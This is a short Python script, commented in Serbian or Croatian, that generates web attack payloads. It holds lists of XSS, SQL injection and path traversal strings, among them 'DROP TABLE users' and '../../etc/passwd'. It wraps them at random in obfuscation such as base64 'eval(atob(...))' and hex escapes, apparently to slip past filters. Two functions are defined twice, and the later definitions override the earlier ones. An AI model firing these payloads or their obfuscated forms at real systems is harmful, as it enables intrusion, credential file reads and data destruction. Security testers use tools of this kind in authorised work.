import random
import base64

# === Kategorije osnovnih payload-a ===
base_xss = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "<body onload=alert('XSS')>"
]

base_sqli = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, NULL--",
    "' AND sleep(5)--"
]

base_lfi = [
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "../../../../../../boot.ini"
]

# Modul za mutaciju i obfuskaciju payload-a
def generate_mutated_payload(base):
    return base[::-1]  # simple mutation

def obfuscate_payload(payload):
    import base64
    encoded = base64.b64encode(payload.encode("utf-8")).decode("utf-8")
    return f"eval(atob('{encoded}'))"
# === Encode + wrapper funkcije ===
def obfuscate_payload(payload):
    return ''.join(f'\\x{ord(c):02x}' for c in payload)


def b64_wrap(payload):
    return f"eval(atob('{base64.b64encode(payload.encode()).decode()}'))"

def quote_wrap(payload):
    return f'"{payload}"'

def js_escape(payload):
    return ''.join(['\\x' + hex(ord(c))[2:] for c in payload])

# === Generator ===
def generate_mutated_payload(vuln_type="xss"):
    base_list = {
        "xss": base_xss,
        "sqli": base_sqli,
        "lfi": base_lfi
    }.get(vuln_type, base_xss)

    p = random.choice(base_list)
    mutation = random.choice([b64_wrap, quote_wrap, js_escape])
    return mutation(p)

# === Test primer ===
if __name__ == "__main__":
    for v in ["xss", "sqli", "lfi"]:
        print(f"\n[vuln={v.upper()}] → {generate_mutated_payload(v)}")

